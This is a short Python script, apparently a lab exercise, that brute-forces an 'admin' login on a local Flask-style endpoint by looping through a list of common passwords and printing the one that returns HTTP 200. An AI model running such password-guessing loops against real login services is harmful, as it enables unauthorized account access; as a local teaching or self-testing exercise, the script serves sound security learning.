import requests

url = "http://127.0.0.1:5000/login"
passwords = ["azerty", "1234", "admin", "supersecret", "qwerty"]

for password in passwords:
    response = requests.get(url, params={"username": "admin", "password": password})
    print(f"Essai : {password} → {response.status_code}")
    if response.status_code == 200:
        print(f"\nMot de passe : {password}")
        break